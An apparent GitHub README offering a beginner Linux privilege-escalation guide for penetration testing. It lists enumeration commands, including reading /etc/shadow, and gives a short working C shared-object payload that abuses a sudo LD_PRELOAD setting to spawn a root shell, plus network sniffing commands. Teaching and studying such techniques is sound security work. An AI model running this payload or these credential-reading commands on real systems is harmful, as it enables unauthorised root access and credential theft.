# Linux-PrivEsc-full-guide

Hi Folks! I made this repo that share the privilege escalation techniques I tend to use on Linux systems. At the moment, you will see basic stuff which works the best IRL but later I am going to add CTF specific techniques. Let's get into it!

# Enumeration

So, one of the your target companys users downloaded and executed a malicious file you happened to send them. You found credentials in clear text and connected back to the machine using SSH. What's the first thing you do? Identify where the hell are you and what you can do at this point of the engagement. For that I use the following commands:

history (to identify previously executed commands in the shell)
whoami, id ( to enumerate the user)
cat /etc/passwd, cat etc/shadow, cat /etc/group (check if we can see the stored passwords, users, groups)
ps aux, ps aux | grep root (to see unusual processes and processes run by the root user)
hostname, uname -a, cat proc/version, cat /etc/issue, lscpu (to further enumerate the system, kernel version, errors..etc)
sudo -l (to check which commands I can run as a super user without the password)

After executing sudo -l check the value of LD_PRELOAD, if you see something like this: env_keep += LD_PRELOAD. Than you can use the following little C script to gain root access:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}


# Network enumeration

ifconfig (to see network interfaces, ip addresses..etc)
ip a (alternative for ifconfig)
arp -a (to check to ARP table and discover additional assets on the subnet)
ip neigh (alternative for the arp command)
ip route (to check the route table and discover gateways, additional IPs)
netstat (to see active connections)

wireshark
tcpdump -i <interface> -s 65535 -w <file> 

(Try to sniff traffic, it's less noisy and you have more data to work with during the engagement)
